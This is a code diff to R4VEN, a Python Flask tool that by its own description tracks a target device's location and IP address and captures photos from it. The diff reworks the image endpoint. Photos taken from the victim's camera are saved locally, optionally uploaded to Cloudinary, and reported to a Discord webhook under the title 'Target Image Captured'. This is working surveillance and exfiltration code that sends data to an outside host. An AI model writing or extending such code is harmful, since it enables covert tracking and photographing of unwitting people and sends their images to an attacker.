@@ -12,7 +12,8 @@ import time
 from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
 import signal
-from utils import get_file_data, update_webhook, check_and_get_webhook_url
+# Make sure to import the cloudinary upload function
+from utils import get_file_data, update_webhook, check_and_get_webhook_url, upload_image_to_cloudinary
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
@@ -31,6 +32,10 @@ else:
     R = G = C = W = Y = M = B = ''
 
 app = Flask(__name__)
+
+# --- Add a global var for cloudinary status ---
+g_cloudinary_enabled = False
+# ---------------------------------------------
 
 parser = argparse.ArgumentParser(
     description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
@@ -70,22 +75,66 @@ def update_location():
 @app.route('/image', methods=['POST'])
 def image():
     i = request.files['image']
-    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    i.save('%s/%s' % (os.getcwd(), f))
-    #print(f"{B}[+] {C}Picture of the target captured and saved")
+    # Define a snapshots directory
+    snapshots_dir = os.path.join(os.getcwd(), "snapshots")
+    if not os.path.exists(snapshots_dir):
+        os.makedirs(snapshots_dir)
+
+    # Save the image locally first
+    filename = '%s.jpeg' % time.strftime("%Y%m%d-%H%M%S")
+    local_path = os.path.join(snapshots_dir, filename)
+    i.save(local_path)
+    print(f"{B}[+] {C}Picture captured and saved locally to {local_path}{W}")
 
     webhook_url = check_and_get_webhook_url(os.getcwd())
-    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
-    response = requests.post(webhook_url, files=files)
+    
+    # Default message
+    discord_message = {
+        "content": f"Target picture captured and saved locally at `{filename}`. Cloudinary upload is disabled or failed."
+    }
 
-    return Response("%s saved and sent to Discord webhook" % f)
+    # If cloudinary is enabled, try to upload
+    if g_cloudinary_enabled:
+        # Create a unique public_id for the image
+        public_id = f"r4ven_capture_{time.strftime('%Y%m%d_%H%M%S')}"
+        upload_result = upload_image_to_cloudinary(local_path, public_id=public_id)
+        
+        if upload_result and upload_result.get("secure_url"):
+            image_url = upload_result.get("secure_url")
+            # Update the discord message with the Cloudinary URL
+            discord_message = {
+                "embeds": [
+                    {
+                        "title": "R4ven Target Image Captured",
+                        "description": "A new image has been captured from the target device.",
+                        "image": {
+                            "url": image_url
+                        },
+                        "color": 65280, # Green
+                        "footer": {
+                            "text": f"Public ID: {public_id}"
+                        }
+                    }
+                ]
+            }
+        else:
+            print(f"{R}[-] Failed to upload image to Cloudinary.{W}")
+
+    # Send the final message to Discord
+    update_webhook(webhook_url, discord_message)
+
+    return Response("Image processed and status sent to Discord webhook.", content_type="text/plain")
 
 @app.route('/get_target', methods=['GET'])
 def get_url():
     return args.target
 
 #run_flask function to handle threading
-def run_flask(folder_name):
+def run_flask(folder_name, cloudinary_enabled=False):
+    # Set the global status for cloudinary
+    global g_cloudinary_enabled
+    g_cloudinary_enabled = cloudinary_enabled
+
     try:
         os.chdir(folder_name)
     except FileNotFoundError:
